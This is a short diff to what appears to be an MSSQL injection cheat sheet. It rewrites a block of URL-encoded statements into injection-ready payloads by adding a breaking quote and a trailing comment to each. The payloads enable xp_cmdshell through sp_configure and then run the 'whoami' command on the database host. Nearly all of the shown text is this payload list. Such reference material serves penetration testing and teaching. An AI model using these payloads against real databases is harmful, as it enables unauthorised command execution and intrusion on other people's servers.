@@ -45,11 +45,11 @@ SQL> execute xp_cmdshell 'whoami';
 ```
 and URL encoded:
 ```
-execute%20sp_configure%20%27show%20advanced%20options%27%2C%201%3B
-reconfigure%3B
-execute%20sp_configure%20%27xp_cmdshell%27%3B
-reconfigure%3B
-execute%20xp_cmdshell%20%27whoami%27%3B
+'%20execute%20sp_configure%20%27show%20advanced%20options%27%2C%201%3B%20--%20//
+'%20reconfigure%3B%20--%20//
+'%20execute%20sp_configure%20%27xp_cmdshell%27%3B%20--%20//
+'%20reconfigure%3B%20--%20//
+'%20execute%20xp_cmdshell%20%27whoami%27%3B%20--%20//
 ```
 
 #### In blind mode
